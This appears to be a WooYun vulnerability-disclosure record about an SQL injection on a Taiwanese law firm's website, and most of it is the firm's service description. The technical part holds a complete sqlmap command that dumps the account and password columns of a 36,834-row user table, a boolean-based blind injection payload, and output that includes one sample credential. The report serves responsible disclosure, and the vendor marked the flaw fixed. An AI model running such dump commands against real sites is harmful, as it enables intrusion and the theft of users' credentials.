{"id": 80846, "wybug_id": "wooyun-2015-0155035", "wybug_title": "永然聯合法律事務所主站存在SQl注入漏洞（36834名用户明文密码泄露）（臺灣地區）", "wybug_corp": "永然聯合法律事務所", "wybug_author": "路人甲", "wybug_date": "2015-11-26 13:53", "wybug_open_date": "2016-01-13 12:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向公众公开  简要描述： 永然聯合法律事務所台北所於1985年12月18日由現任所長李永然律師創立，提供之法律服務項目包括：一、訴訟（含民事、刑事、行政）、強制執行及調解承辦台灣各級法院之訴訟案件、強制執行等非訟事務，以及與政府行政單位間之訴願、行政訴訟案件。關於承辦之案件類型涵括刑事訴訟案件、民事案件、行政訴訟、商事契約、勞僱關係、不動產交易、醫療、票據、證券、產品責任、國際貿易、債務清償及清算、公平交易、家事、保險（包括個人或公司之理賠、貨運及旅遊申訴）及各類協調；非訟案件之範圍則包括財產之強制執行、各式提存、假扣押及假處分等保全程序、收養、夫妻分別財產登記、自然人或法人之財產調查、公證認證事務之代理等。二、軍事偵審辯護現役軍人犯《陸海空刑法》或其特別法之罪，依《軍事審判法》之規定追訴、審判之，其在戰時犯《陸海空刑法》或其特別法以外之罪者，亦同。非現役軍人不受軍事審判。但《戒嚴法》有特別規定者，從其規定。被告得隨時選任辯護人。犯罪嫌疑人受軍法警察或其軍法警察調查者，亦同。《軍事審判法》第69條定有明文。易言之，被告不論在偵查程序或審判程序，均得選任律師為其辯護，維護應有權益。本法律事務所有多位經驗豐富之律師，提供軍法辯護。三、仲裁提供商務、工程、證券、貿易等仲裁案件之代理、外國仲裁判斷之承認與執行，所內並有多位經驗豐富律師曾有擔任仲裁人之經驗，可提客戶最優質之法律服務。四、公司投資與金融保險處理金融與保險業相關法律服務並協助客戶處理國內外投資、公司設立、併購、技術合作、證券交易、稅務處理、財團法人之申設及其他商務活動等商業相關法律問題。服務項目包括契約之擬訂審查、事業體之購併、公司清算、破產、重整聲請、財務規劃、證券交易之規劃、股權分派、勞資協議、債務清償及公司組織等相關事務之法律諮詢與談判。 五、國際貿易協助客戶進行進出口貿易之磋商與談判、代理及經銷契約等進出口貿易文件之研擬與審查，並處理反傾銷、補貼及防衛措施等貿易救濟、信用狀等國際貿易糾紛等法律事務，本所皆能配合客戶需求，提供最完整之法律服務。六、稅務與信託規劃協助客戶從事個人投資理財之商務活動，並就遺產稅、贈與稅、不動產交易相關稅務之事務提供法律諮詢。服務之項目亦涵括財產信託之辦理、信託契約之研擬、稅務規劃、行政爭訟之處理。 七、不動產交易及開發提供個人不動產、公司法人商業用不動產的買賣、大型土地開發、公共工程、土地分割或合併等法律服務，包括各類型土地之使用計劃諮詢、談判、財務分配、不動產租賃之規劃、擔保文件之擬定審查、契約之審擬及不動產證券化等，並且協助台商至中國大陸進行不動產投資、設廠用地取得等商務活動。另亦與永然地政士事務所合作，共同協助國內外個人或廠商向相關機關申請各式不動產文件，暨辦理土地分割、不動產所有權之移轉與設定他項權利登記、信託登記等事務。八、營建及公共工程提供關於政府採購、營建、工共工程等相關法律服務，項目包括工程契約之研擬、技術移轉、採購合約之審議與談判、招標、投標、稅務規劃等法律事務。九、公寓大廈之管理與保全協助客戶成立公寓大廈管理委員會及處理社區住戶間履行規約所生之爭議，服務範圍包含公寓大廈管理委員會之報備、社區及住戶規約等相關文件之擬定、協助召開區分所有權人大會、及住戶間履行規約時所產生之公寓大廈管理條例相關法律事件之諮詢與協商、並提供公寓大廈管理委員會、物業管理維護公司及保全公司之常年法律顧問的服務。十、報業、出版業、廣播、電視事業本所具有處理廣播電臺、無線電視、有線電視、衛星電視、報業、出版業等大眾傳播事業各項領域法律案件之豐富經驗，服務範圍涵蓋大眾傳播事業之成立、電臺之申設、頻道之買賣、技術之移轉、代理及行政救濟等相關法律因應之道 ，並提供廣播電臺、無線電視、有線電視、衛星電視、報業、出版業等相關行業之常年法律顧問之服務。十一、智財管理與技術授權處理智慧財產權保護、管理、專利爭議及因科技運用所生之智慧財產權之紛爭與侵權行為，並就營業秘密、智財保護等方面提供法律諮詢、訴訟、維護權益之策略分析、相關合約之設計等法律服務。亦協助客戶辦理商標、專利登記、技術授權及轉讓合約之研擬，且與亞信國際專利商標事務所策略聯盟，共同協助國內外廠商進行專利商標之登記及著作權之保護。十二、公平交易案件辦理公平交易法各向許可案之申請、多層次傳銷事實之報備，不實廣告、搭售、多層次傳銷以及大型流通業不公平競爭等之檢舉，其他違反公平交易案件之申訴與答辯、公平交易相關法律諮詢，以及公平交易之行政救濟及訴訟。十三、勞動法規提供勞、資雙方處理勞資問題之相關法律服務，項目包括聘僱契約、工作規則以及員工保密、競業禁止等人事規約、團體協約之撰擬與審核、勞資爭議之協調、勞工保險、職業災害等勞資爭議之訴訟；並提供外籍勞工、外籍專業人員聘僱以及其他勞工相關法令之諮詢。十四、環境保護相關法律服務提供民眾及事業環境保護之相關法律資訊及法律訴訟服務，項目包括土壤及地下水污染整治法、廢棄物清理法、噪音管制法、空氣污染防制法、水污染防治法等相關環境保護法規之規範、執行、救濟；並提供事業如何進行環境影響評估及事業從事企業行為所應行注意之相關環保法令規範。十五、涉外法律事務協助當事人從事多地區事業時所需之各領域的法律意見諮詢，服務的範圍含括擬定各類國際商務所需之契約書、加盟、執照申請、技術移轉、配銷及代理合約、進出口文件、國外公司機構在台代表處設立申請報備等。同時提供客戶關於智慧財產權、稅務、財務等問題之法律諮詢，以及跨國性協調事務之處理與談判。 详细说明：  地址：http://**.**.**.**/newdesign/comptaipei/chinalawview.asp?idno=207\n$ python sqlmap.py -u \"http://**.**.**.**/newdesign/comptaipei/chinalawview.asp?idno=207\" -p idno --technique=B --random-agent --batch --threads=10  -Tvip -C account,password --dump\n   漏洞证明：  \n---Parameter: idno (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: idno=207 AND 3768=3768---web server operating system: Windows 2000web application technology: Microsoft IIS 5.0back-end DBMS: Microsoft Accesscurrent user:\tNonecurrent user is DBA:\tNoneDatabase: Microsoft_Access_masterdb+---------+---------+| Table   | Entries |+---------+---------+| vip     | 36834   || manager | 40      || study   | 22      |+---------+---------+sqlmap resumed the following injection point(s) from stored session:---Parameter: idno (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: idno=207 AND 3768=3768---web server operating system: Windows 2000web application technology: ASP, Microsoft IIS 5.0back-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdbTable: vip[3 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| account  | non-numeric || error    | non-numeric || password | numeric     |+----------+-------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: idno (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: idno=207 AND 3768=3768/code>选取部分进行展示：<code>Table: vip[1 entry]+-------+-----------+----------+| error | account   | password |+-------+-----------+----------+| Er    | perennial | 00000    |+-------+-----------+----------+<\n   修复方案：  增加过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-11-29 12:30 厂商回复： 感謝通報 最新状态： 2016-01-20：已修復  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}